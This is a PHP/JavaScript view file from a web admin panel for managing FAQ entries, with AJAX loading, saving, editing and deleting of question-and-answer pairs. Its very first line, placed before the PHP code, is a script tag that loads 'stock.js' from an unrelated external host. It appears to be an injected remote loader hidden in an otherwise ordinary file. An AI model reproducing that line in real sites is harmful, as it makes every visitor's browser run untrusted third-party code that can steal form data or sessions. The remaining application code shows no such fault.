<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->faq;$data['focus']=$this->judul; $this->load->view($this->generalHeader,$data) ?>
<div class="" id="result-content"></div>
<?php form($this->faq,$baseView,$this->modalFullScreen) ?>

<script>
    var urlLocal    = `${strSection}/${strFaq}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var judul        = attrId(strJudul);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;
    var noPage=1;
    $(document).ready(function() {
        for (var i = 0; i < no+1; ++i) {
            window["quillPertanyaan"+i] = i;
            window["quillJawaban"+i] = i;
        }
        anyPage.val();
        loadData(1);
        tag = new Tagify(document.querySelector("#tag"));
    });
    function removeLocalData(){
        var rmData=[strNama,strId,strParamJudul,strParamId];
        rmData.forEach(function(row){rmStorage(row);})
    }

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        if(totalRow>lastRow){
            removeLocalData();
            loadData(toInt(noPage)+par);
        }
    }
    function prevLoad(par){
        if(noPage > 1){
            removeLocalData();
            loadData(toInt(noPage)-par);
        }
    }

    function loadData(page=1,isCache=true){
        noPage=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }
    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            removeLocalData();
            timeOut(function(){loadData(1,false)})
        }
    }

    formInput.validate({
        rules: {
            judul: {
                required: true,
                remote: {url: `${strFaq}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}
            }
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            var formData=new FormData(formInput[0]);
            for(let i=1;i<no+1;i++){
                var quillPertanyaan = document.querySelector(`#pertanyaan_${i}`);
                var pertanyaan      = quillPertanyaan.children[0].innerHTML;
                var quillJawaban    = document.querySelector(`#jawaban_${i}`);
                var jawaban         = quillJawaban.children[0].innerHTML;
                if(!isQuill(pertanyaan,"0")){
                    timeOut(function(){location.hash=`#pertanyaan_${i}`;eval("quillPertanyaan"+i).focus();});
                    return;
                }
                else{formData.append("pertanyaan_"+i, pertanyaan);}
                if(!isQuill(jawaban,"1")){timeOut(function(){location.hash=`#jawaban_${i}`;eval("quillJawaban"+i).focus();});return;}
                else{formData.append("jawaban_"+i, jawaban);}
            }
            formData.append("no",no);
            ajaxFile(
                base_url+urlLocal+urlSave,
                formData,
                function (res) {
                    if (res.status) {
                        validateSaveHmtl(judul.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                            removeLocalData();
                            if(!searchName) anyPage.val("");
                            loadData(page,false);
                            notif(strSuccess);
                            modalForm.modal(strHide);
                            delForm(formInput);
                            paramForm.val(strAdd);
                        })
                    } else {
                        notif(strFailed);
                    }
                }
            );
        }
    });
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                setFocus(strJudul);
                var data=res.res_data;
                var arrId = [strId,strJudul];
                var desc= JSON.parse(data[strDeskripsi]);
                arrId.forEach(function(row){attrId(row).val(data[row])});
                no=desc.length-1;
                var html="";
                for (var i = 0; i < desc.length; i++) {
                    let index=i+1;
                    no=index;
                    window["quillPertanyaan"+index];
                    window["quillJawaban"+index];
                    html+=templateFaq(index);
                }
                attrId("wrapperFaq").html(html);
                for(let i=0;i<desc.length;i++){
                    let index=i+1;
                    setTimeout(function(){
                        setQuill(eval("quillPertanyaan"+index),desc[i][strPertanyaan]);
                        setQuill(eval("quillJawaban"+index),desc[i][strJawaban]);
                    },300)
                }
            } else {
                notif(strError);
            }
        },false);

    }
    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            removeLocalData();
            loadData(page,isCache);
        })
    }
    function addFaq(isScroll=true){
        if(no>9){
            notif(strError,`${strNotifMaxInput} 10`);
        }
        else{
            no=no+1;
            attrId("wrapperFaq").append(templateFaq(no));
        }
    }
    function delFaq(){
        if(no>1){
            attrId(`${strFaq}_${no}`).remove();
            templateFaq(no);
            no=no-1;
            timeOut(function(){location.hash=`#${strFaq}_${no}`;})
        }
    }
    function templateFaq(no){
        let html='';
        html+='<div class="row mb-1" id="faq_'+no+'">';
        html+='<div class="col-md-6"><div id="pertanyaan_'+no+'"></div></div><div class="col-md-6"><div id="jawaban_'+no+'"></div></div>';
        html+='</div>';
        setTimeout(function(){
            this['quillPertanyaan'+no]  = setCkeditor("pertanyaan_"+no,"tulis pertanyaan ke "+no+" disini ....");
            this['quillJawaban'+no]     = setCkeditor("jawaban_"+no,"tulis jawaban ke "+no+" disini ....");
        },100);
        return html;
    }
    modalForm.on(strHideModal, function () {
        delForm(formInput);
        no = 1;
        timeOut(function(){
            var html = templateFaq(1);
            attrId("wrapperFaq").html(html);
            location.hash="";
        });
        setTimeout(function(){
            console.log(no);
            attrId("pertanyaan_"+no).remove();
            attrId("jawaban_"+no).remove();
        },300)
    });
    modalForm.on(strShowModal, function () {
        var idx=1;
        var html ="";
        for(let i=1;i<3;i++){
            idx++;
            html+=templateFaq(i);
        }
        no=idx-1;
        attrId("wrapperFaq").html(html);
        location.hash=`#${strFaq}_${no}`;
    });
</script>
